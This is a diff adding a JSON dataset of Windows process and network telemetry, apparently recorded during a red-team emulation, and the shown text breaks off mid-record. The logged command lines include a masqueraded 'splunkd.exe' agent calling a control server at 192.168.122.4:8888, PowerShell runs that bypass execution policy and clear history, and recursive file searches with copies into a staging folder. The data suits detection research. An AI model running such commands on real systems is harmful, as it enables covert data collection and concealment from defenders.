@@ -1,0 +1,1720 @@
+[
+  {
+    "collection": "data_model_event",
+    "content": [
+      {
+        "_cls": "DataModelEvent.NetworkEvent",
+        "_id": "6492dfbbe0faa41fea8bae84",
+        "action": "start",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:11.260000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "network_connection"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "flow",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "NetworkEventState",
+          "dest_fqdn": "-",
+          "dest_ip": "224.0.0.251",
+          "dest_port": "5353",
+          "exe": "splunkd.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "2164",
+          "src_ip": "192.168.122.11",
+          "src_port": "5353",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:32.364000+00:00",
+        "uuid": "DataModelEvent.NetworkEvent-desktop-f7vudu8-flow-start-2023-06-21t11:25:32-192.168.122.11-5353-224.0.0.251-5353-2164-none"
+      },
+      {
+        "_cls": "DataModelEvent.NetworkEvent",
+        "_id": "6492dfbbe0faa41fea8bae87",
+        "action": "start",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:11.292000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "network_connection"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "flow",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "NetworkEventState",
+          "dest_fqdn": "-",
+          "dest_ip": "ff02:0:0:0:0:0:0:fb",
+          "dest_port": "5353",
+          "exe": "splunkd.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "2164",
+          "src_ip": "fe80:0:0:0:fa69:94ba:d54b:3f71",
+          "src_port": "5353",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:32.365000+00:00",
+        "uuid": "DataModelEvent.NetworkEvent-desktop-f7vudu8-flow-start-2023-06-21t11:25:32-fe80:0:0:0:fa69:94ba:d54b:3f71-5353-ff02:0:0:0:0:0:0:fb-5353-2164-none"
+      },
+      {
+        "_cls": "DataModelEvent.NetworkEvent",
+        "_id": "6492dfbbe0faa41fea8bae8a",
+        "action": "start",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:11.328000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "network_connection"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "flow",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "NetworkEventState",
+          "dest_fqdn": "-",
+          "dest_ip": "192.168.122.4",
+          "dest_port": "8888",
+          "exe": "splunkd.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "2164",
+          "src_ip": "192.168.122.11",
+          "src_port": "56231",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:33.426000+00:00",
+        "uuid": "DataModelEvent.NetworkEvent-desktop-f7vudu8-flow-start-2023-06-21t11:25:33-192.168.122.11-56231-192.168.122.4-8888-2164-none"
+      },
+      {
+        "_cls": "DataModelEvent.NetworkEvent",
+        "_id": "6492e00be0faa41fea8baebf",
+        "action": "start",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:33:31.627000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492e009e0faa41fea8bae92",
+            "label": "network_connection"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "flow",
+        "reverse_links": [
+          "6492e009e0faa41fea8bae92"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "NetworkEventState",
+          "dest_fqdn": "-",
+          "dest_ip": "192.168.122.4",
+          "dest_port": "8888",
+          "exe": "<unknown process>",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "<unknown process>",
+          "pid": "3464",
+          "src_ip": "192.168.122.11",
+          "src_port": "56241",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:33:10.754000+00:00",
+        "uuid": "DataModelEvent.NetworkEvent-desktop-f7vudu8-flow-start-2023-06-21t11:33:10-192.168.122.11-56241-192.168.122.4-8888-3464-none"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8bada5",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.149000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 796 800 808 8192 804 780 ",
+          "exe": "SearchFilterHost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\SearchFilterHost.exe",
+          "integrity_level": "Medium",
+          "md5_hash": "CBE5C77B387346F6ACE43A512CFEFDCC",
+          "parent_exe": "SearchIndexer.exe",
+          "parent_image_path": "C:\\Windows\\System32\\SearchIndexer.exe",
+          "pid": "8260",
+          "ppid": "3100",
+          "sha1_hash": "7AD70F1B4B801386BC041CC9D06620D761A1755A",
+          "terminal_session_id": "0",
+          "user": "NT AUTHORITY\\SYSTEM"
+        },
+        "time": "2023-06-21T11:25:29.465000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:25:29-8260"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8bada6",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.152000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "child_process"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "splunkd.exe",
+          "parent_image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "9628",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:32.196000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:25:32-9628"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badab",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.218000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "child_process"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "splunkd.exe",
+          "parent_image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "9052",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:26:20.208000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:26:20-9052"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badac",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.217000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [
+          {
+            "event": "6492dfb7e0faa41fea8bada6",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badab",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badb1",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badb4",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badbc",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badb7",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badbf",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badc4",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badc8",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badb4",
+            "label": "child_process"
+          },
+          {
+            "event": "6492dfbbe0faa41fea8bae84",
+            "label": "network_connection"
+          },
+          {
+            "event": "6492dfbbe0faa41fea8bae87",
+            "label": "network_connection"
+          },
+          {
+            "event": "6492dfbbe0faa41fea8bae8a",
+            "label": "network_connection"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8bada6",
+            "label": "child_process"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badab",
+            "label": "child_process"
+          },
+          {
+            "event": "6492e009e0faa41fea8bae92",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492e009e0faa41fea8bae8f",
+            "label": "lookup_parent"
+          }
+        ],
+        "labeled_reverse_links": [],
+        "links": [
+          "6492dfb7e0faa41fea8bada6",
+          "6492dfb7e0faa41fea8badab",
+          "6492dfb7e0faa41fea8badb1",
+          "6492dfb7e0faa41fea8badb4",
+          "6492dfb7e0faa41fea8badbc",
+          "6492dfb7e0faa41fea8badb7",
+          "6492dfb7e0faa41fea8badbf",
+          "6492dfb7e0faa41fea8badc4",
+          "6492dfb7e0faa41fea8badc8",
+          "6492dfbbe0faa41fea8bae84",
+          "6492dfbbe0faa41fea8bae87",
+          "6492dfbbe0faa41fea8bae8a",
+          "6492e009e0faa41fea8bae92",
+          "6492e009e0faa41fea8bae8f"
+        ],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.122.4:8888 -group red ",
+          "exe": "splunkd.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Users\\Public\\splunkd.exe",
+          "integrity_level": "High",
+          "md5_hash": "8313B666AF369C6A13D8FC3829735FF9",
+          "parent_exe": "powershell.exe",
+          "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "pid": "2164",
+          "ppid": "164",
+          "sha1_hash": "66527497DBC2AEAD32CD60AFDAFD057D634FFFE6",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:31.024000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:25:31-2164"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badb1",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.247000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "4280",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:27:09.237000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:27:09-4280"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badb4",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.253000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          },
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "child_process"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "exe": "conhost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\conhost.exe",
+          "integrity_level": "High",
+          "md5_hash": "86191D9E0E30631DB3E78E4645804358",
+          "parent_exe": "splunkd.exe",
+          "parent_image_path": "C:\\Users\\Public\\splunkd.exe",
+          "pid": "9244",
+          "ppid": "2164",
+          "sha1_hash": "9ED0146BC74788288D30D3D05FBCB4CCAB2BE0A7",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:25:31.085000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:25:31-9244"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badb7",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.264000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "8204",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:27:53.266000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:27:53-8204"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badbc",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.296000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "3216",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:28:42.305000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:28:42-3216"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badbf",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.318000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item C:\\Users\\jorge\\Downloads\\logstash-8.7.1\\logstash-8.7.1\\vendor\\bundle\\jruby\\2.6.0\\gems\\http-3.3.0\\logo.png C:\\Windows\\system32\\staged\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "1060",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:29:36.330000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:29:36-1060"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badc0",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.324000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 796 800 808 8192 804 780 ",
+          "exe": "SearchFilterHost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\SearchFilterHost.exe",
+          "integrity_level": "Medium",
+          "md5_hash": "CBE5C77B387346F6ACE43A512CFEFDCC",
+          "parent_exe": "SearchIndexer.exe",
+          "parent_image_path": "C:\\Windows\\System32\\SearchIndexer.exe",
+          "pid": "8664",
+          "ppid": "3100",
+          "sha1_hash": "7AD70F1B4B801386BC041CC9D06620D761A1755A",
+          "terminal_session_id": "0",
+          "user": "NT AUTHORITY\\SYSTEM"
+        },
+        "time": "2023-06-21T11:27:44.881000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:27:44-8664"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badc4",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.343000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item C:\\Users\\jorge\\Downloads\\logstash-8.7.1\\logstash-8.7.1\\vendor\\bundle\\jruby\\2.6.0\\gems\\elastic-app-search-7.8.0\\logo-app-search.png C:\\Windows\\system32\\staged\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "4640",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:30:21.372000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:30:21-4640"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badc8",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.361000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [
+          {
+            "event": "6492dfb7e0faa41fea8badac",
+            "label": "lookup_parent"
+          }
+        ],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [
+          "6492dfb7e0faa41fea8badac"
+        ],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item C:\\Users\\jorge\\OneDrive\\Documentos\\LTspiceXVII\\examples\\Educational\\ring.wav C:\\Windows\\system32\\staged\"",
+          "exe": "powershell.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "integrity_level": "High",
+          "md5_hash": "BCF01E61144D6D6325650134823198B8",
+          "parent_exe": "-",
+          "parent_image_path": "-",
+          "pid": "9732",
+          "ppid": "2164",
+          "sha1_hash": "EB39E26A364ECD0691A59FCEF61A90334112617E",
+          "terminal_session_id": "1",
+          "user": "DESKTOP-F7VUDU8\\jorge"
+        },
+        "time": "2023-06-21T11:31:07.369000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:31:07-9732"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492dfb7e0faa41fea8badc9",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:32:07.359000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 796 800 808 8192 804 780 ",
+          "exe": "SearchFilterHost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\SearchFilterHost.exe",
+          "integrity_level": "Medium",
+          "md5_hash": "CBE5C77B387346F6ACE43A512CFEFDCC",
+          "parent_exe": "SearchIndexer.exe",
+          "parent_image_path": "C:\\Windows\\System32\\SearchIndexer.exe",
+          "pid": "6360",
+          "ppid": "3100",
+          "sha1_hash": "7AD70F1B4B801386BC041CC9D06620D761A1755A",
+          "terminal_session_id": "0",
+          "user": "NT AUTHORITY\\SYSTEM"
+        },
+        "time": "2023-06-21T11:30:07.356000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:30:07-6360"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492e009e0faa41fea8bae8c",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:33:29.711000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
+        "labeled_links": [],
+        "labeled_reverse_links": [],
+        "links": [],
+        "metadata": {},
+        "object_type": "process",
+        "reverse_links": [],
+        "sessions": [
+          "6492dfafe36f03f45b27b603"
+        ],
+        "state": {
+          "_cls": "ProcessEventState",
+          "command_line": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 796 800 808 8192 804 780 ",
+          "exe": "SearchFilterHost.exe",
+          "fqdn": "DESKTOP-F7VUDU8",
+          "hostname": "DESKTOP-F7VUDU8",
+          "image_path": "C:\\Windows\\System32\\SearchFilterHost.exe",
+          "integrity_level": "Medium",
+          "md5_hash": "CBE5C77B387346F6ACE43A512CFEFDCC",
+          "parent_exe": "SearchIndexer.exe",
+          "parent_image_path": "C:\\Windows\\System32\\SearchIndexer.exe",
+          "pid": "9320",
+          "ppid": "3100",
+          "sha1_hash": "7AD70F1B4B801386BC041CC9D06620D761A1755A",
+          "terminal_session_id": "0",
+          "user": "NT AUTHORITY\\SYSTEM"
+        },
+        "time": "2023-06-21T11:32:20.886000+00:00",
+        "uuid": "DataModelEvent.ProcessEvent-desktop-f7vudu8-process-create-2023-06-21t11:32:20-9320"
+      },
+      {
+        "_cls": "DataModelEvent.ProcessEvent",
+        "_id": "6492e009e0faa41fea8bae8f",
+        "action": "create",
+        "confidence": 0.0,
+        "discovered_time": "2023-06-21T11:33:29.740000+00:00",
+        "host": "64922a52e0faa41fea8aea7f",
